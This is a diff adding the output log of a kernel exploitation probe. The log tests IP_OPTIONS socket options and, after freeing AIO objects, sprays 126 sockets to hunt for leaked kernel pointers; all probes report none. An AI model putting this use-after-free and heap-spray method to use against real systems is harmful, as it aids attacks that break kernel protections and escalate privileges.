@@ -1,0 +1,208 @@
+=== PROBE 74a: IP_OPTIONS PROPER FORMAT ===
+
+pid=97
+[A] Minimal valid options (4B: NOP NOP NOP EOL)
+  fd=23
+  setsockopt ret=0
+  getsockopt ret=0 len=8
+  A +0x00: 00 00 00 00 01 01 01 00 DE DE DE DE DE DE DE DE
+  A +0x10: DE DE DE DE DE DE DE DE
+  kptrs=0
+
+[B] Maximum valid options (40B: 39×NOP + EOL)
+  fd=23
+  setsockopt ret=0
+  getsockopt ret=0 len=44
+  B +0x00: 00 00 00 00 01 01 01 01 01 01 01 01 01 01 01 01
+  B +0x10: 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
+  B +0x20: 01 01 01 01 01 01 01 01 01 01 01 00 DE DE DE DE
+  B +0x30: DE DE DE DE DE DE DE DE DE DE DE DE
+  kptrs=0
+
+[C] Record Route option (type=0x07, len=39)
+  fd=23
+  setsockopt ret=0
+  getsockopt ret=0 len=44
+  C +0x00: 00 00 00 00 07 27 04 00 00 00 00 00 00 00 00 00
+  C +0x10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  C +0x20: 00 00 00 00 00 00 00 00 00 00 00 00 DE DE DE DE
+  C +0x30: DE DE DE DE DE DE DE DE DE DE DE DE
+  kptrs=0
+
+[D] AIO free + IP_OPTIONS spray
+  zero_fd=23
+  submitted 32 AIO requests
+  deleted 32/32 R objects (kernel ptrs survive)
+  socket failed at i=127
+  sprayed 126 sockets with 40B IP_OPTIONS
+  spray[1] fd=24 len=44
+  spray[2] fd=25 len=44
+  spray[3] fd=26 len=44
+  spray[4] fd=27 len=44
+  spray[5] fd=28 len=44
+  spray[6] fd=29 len=44
+  spray[7] fd=30 len=44
+  spray[8] fd=31 len=44
+  spray[9] fd=32 len=44
+  spray[10] fd=33 len=44
+  spray[11] fd=34 len=44
+  spray[12] fd=35 len=44
+  spray[13] fd=36 len=44
+  spray[14] fd=37 len=44
+  spray[15] fd=38 len=44
+  spray[16] fd=39 len=44
+  spray[17] fd=40 len=44
+  spray[18] fd=41 len=44
+  spray[19] fd=42 len=44
+  spray[20] fd=43 len=44
+  spray[21] fd=44 len=44
+  spray[22] fd=45 len=44
+  spray[23] fd=46 len=44
+  spray[24] fd=47 len=44
+  spray[25] fd=48 len=44
+  spray[26] fd=49 len=44
+  spray[27] fd=50 len=44
+  spray[28] fd=51 len=44
+  spray[29] fd=52 len=44
+  spray[30] fd=53 len=44
+  spray[31] fd=54 len=44
+  spray[32] fd=55 len=44
+  spray[33] fd=56 len=44
+  spray[34] fd=57 len=44
+  spray[35] fd=58 len=44
+  spray[36] fd=59 len=44
+  spray[37] fd=60 len=44
+  spray[38] fd=61 len=44
+  spray[39] fd=62 len=44
+  spray[40] fd=63 len=44
+  spray[41] fd=64 len=44
+  spray[42] fd=65 len=44
+  spray[43] fd=66 len=44
+  spray[44] fd=67 len=44
+  spray[45] fd=68 len=44
+  spray[46] fd=69 len=44
+  spray[47] fd=70 len=44
+  spray[48] fd=71 len=44
+  spray[49] fd=72 len=44
+  spray[50] fd=73 len=44
+  spray[51] fd=74 len=44
+  spray[52] fd=75 len=44
+  spray[53] fd=76 len=44
+  spray[54] fd=77 len=44
+  spray[55] fd=78 len=44
+  spray[56] fd=79 len=44
+  spray[57] fd=80 len=44
+  spray[58] fd=81 len=44
+  spray[59] fd=82 len=44
+  spray[60] fd=83 len=44
+  spray[61] fd=84 len=44
+  spray[62] fd=85 len=44
+  spray[63] fd=86 len=44
+  spray[64] fd=87 len=44
+  spray[65] fd=88 len=44
+  spray[66] fd=89 len=44
+  spray[67] fd=90 len=44
+  spray[68] fd=91 len=44
+  spray[69] fd=92 len=44
+  spray[70] fd=93 len=44
+  spray[71] fd=94 len=44
+  spray[72] fd=95 len=44
+  spray[73] fd=96 len=44
+  spray[74] fd=97 len=44
+  spray[75] fd=98 len=44
+  spray[76] fd=99 len=44
+  spray[77] fd=100 len=44
+  spray[78] fd=101 len=44
+  spray[79] fd=102 len=44
+  spray[80] fd=103 len=44
+  spray[81] fd=104 len=44
+  spray[82] fd=105 len=44
+  spray[83] fd=106 len=44
+  spray[84] fd=107 len=44
+  spray[85] fd=108 len=44
+  spray[86] fd=109 len=44
+  spray[87] fd=110 len=44
+  spray[88] fd=111 len=44
+  spray[89] fd=112 len=44
+  spray[90] fd=113 len=44
+  spray[91] fd=114 len=44
+  spray[92] fd=115 len=44
+  spray[93] fd=116 len=44
+  spray[94] fd=117 len=44
+  spray[95] fd=118 len=44
+  spray[96] fd=119 len=44
+  spray[97] fd=120 len=44
+  spray[98] fd=121 len=44
+  spray[99] fd=122 len=44
+  spray[100] fd=123 len=44
+  spray[101] fd=124 len=44
+  spray[102] fd=125 len=44
+  spray[103] fd=126 len=44
+  spray[104] fd=127 len=44
+  spray[105] fd=128 len=44
+  spray[106] fd=129 len=44
+  spray[107] fd=130 len=44
+  spray[108] fd=131 len=44
+  spray[109] fd=132 len=44
+  spray[110] fd=133 len=44
+  spray[111] fd=134 len=44
+  spray[112] fd=135 len=44
+  spray[113] fd=136 len=44
+  spray[114] fd=137 len=44
+  spray[115] fd=138 len=44
+  spray[116] fd=139 len=44
+  spray[117] fd=140 len=44
+  spray[118] fd=141 len=44
+  spray[119] fd=142 len=44
+  spray[120] fd=143 len=44
+  spray[121] fd=144 len=44
+  spray[122] fd=145 len=44
+  spray[123] fd=146 len=44
+  spray[124] fd=147 len=44
+  spray[125] fd=148 len=44
+  spray[126] fd=149 len=44
+  D total kptrs: 0
+
+[E] Option length sweep
+  len= 1: set=-1 get=0 retlen=0 extra_past_len=0
+  len= 2: set=-1 get=0 retlen=0 extra_past_len=0
+  len= 3: set=-1 get=0 retlen=0 extra_past_len=0
+  len= 4: set=0 get=0 retlen=8 extra_past_len=0
+  len= 8: set=0 get=0 retlen=12 extra_past_len=0
+  len=12: set=0 get=0 retlen=16 extra_past_len=0
+  len=16: set=0 get=0 retlen=20 extra_past_len=0
+  len=20: set=0 get=0 retlen=24 extra_past_len=0
+  len=24: set=0 get=0 retlen=28 extra_past_len=0
+  len=28: set=0 get=0 retlen=32 extra_past_len=0
+  len=32: set=0 get=0 retlen=36 extra_past_len=0
+  len=36: set=0 get=0 retlen=40 extra_past_len=0
+  len=40: set=0 get=0 retlen=44 extra_past_len=0
+  len=44: set=-1 get=0 retlen=0 extra_past_len=0
+  len=48: set=-1 get=0 retlen=0 extra_past_len=0
+  len=52: set=-1 get=0 retlen=0 extra_past_len=0
+  len=56: set=-1 get=0 retlen=0 extra_past_len=0
+  len=60: set=-1 get=0 retlen=0 extra_past_len=0
+  len=64: set=-1 get=0 retlen=0 extra_past_len=0
+
+[F] IP_HDRINCL + IP_OPTIONS combo
+  fd=24
+  IP_HDRINCL set ret=-1
+  IP_OPTIONS set ret=0
+  getsockopt ret=0 len=44
+  F +0x00: 00 00 00 00 01 01 01 01 01 01 01 01 01 01 01 01
+  F +0x10: 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
+  F +0x20: 01 01 01 01 01 01 01 01 01 01 01 00 DE DE DE DE
+  F +0x30: DE DE DE DE DE DE DE DE DE DE DE DE
+
+[G] Other IP sockopts that may allocate kernel memory
+  IP_MULTICAST_IF(9): ret=0 len=4 kptrs=0
+  IP_TOS(3): ret=0 len=4 kptrs=0
+  IP_TTL(4): ret=0 len=4 kptrs=0
+  IP_RECVOPTS(5): ret=0 len=4 kptrs=0
+  IP_RECVRETOPTS(6): ret=0 len=4 kptrs=0
+  IP_RECVDSTADDR(7): ret=0 len=4 kptrs=0
+  IP_SENDSRCADDR(7): ret=0 len=4 kptrs=0
+  IP_RETOPTS(8): ret=0 len=0 kptrs=0
+
+alive=YES
+=== PROBE 74a COMPLETE ===
